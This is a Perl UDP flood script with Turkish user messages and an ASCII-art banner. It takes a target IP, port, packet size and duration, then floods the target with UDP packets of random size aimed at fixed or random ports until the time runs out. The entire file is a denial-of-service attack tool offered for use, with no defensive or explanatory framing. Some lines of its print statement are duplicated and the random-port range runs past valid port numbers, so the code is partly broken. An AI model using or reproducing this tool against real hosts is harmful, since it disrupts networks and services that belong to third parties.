#!/usr/bin/perl

##                           ##
# Mrschwartz UDP Floot Script #
##                           ##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Host Adı Bulunamadı Lütfen Farklı Şekilde Deneyiniz. $ip\n";
$endtime = time() + ($time ? $time : 99999999);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;

                      .
                      00
                      000
                     00000                  .
                     000000                00
      .             0000000              0000
      0000          0000000            00000
      00000         00000000          000000
       000000       00000000        0000000
        0000000     00000000      000000000
        0000000      0000000     000000000
         0000000     00000000   000000000
           000000000  0000000   00000000
             0000000   000000  0000000            .
              000000  00000  0000000        000000
   .           000000  0000  000000    000000000
    0000000     000000 000   0000   00000000000
     0000000000   0000  00  0000  00000000000
       00000000000  000 00 000  0000000000
          00000000000 00 0 0  000000000
             00000000000000 0000
                      000000000
                    000     000000
               ~ MRSCHWARTZ UDP FLOOD ~
EOTEXT
 print           "            Saldırdığınız IP Adresi : $ip
            Saldırdığınız Port Adresi : " .
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Saldırınız şuanda gerçekleştiriliyor. ") . "\n";
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Saldırınız şuanda gerçekleştiriliyor. ") . "\n";
        print "Durdurmak için Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(6550000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
